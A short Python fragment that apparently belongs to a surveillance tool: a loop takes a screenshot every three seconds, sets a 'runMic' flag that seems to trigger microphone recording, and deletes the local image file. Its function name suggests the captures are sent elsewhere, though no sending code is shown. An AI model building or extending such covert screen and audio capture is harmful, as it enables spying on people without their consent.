from screen import Screenshot
import time
import os

screenshot = Screenshot()

async def sendScreen():
    count = 0
    determine = count + 1
    while True:
        screenshot.printscreen()
        count += 1
        if count >= determine:
            screenshot.update_env('runMic', "True")

            screenshot_path = f"files\\{time.strftime('%H:%M:%S')}.png"       
            os.remove(screenshot_path) # COMMENT OUT IF YOU WANT TO KEEP IT
            determine += 1
        time.sleep(3)
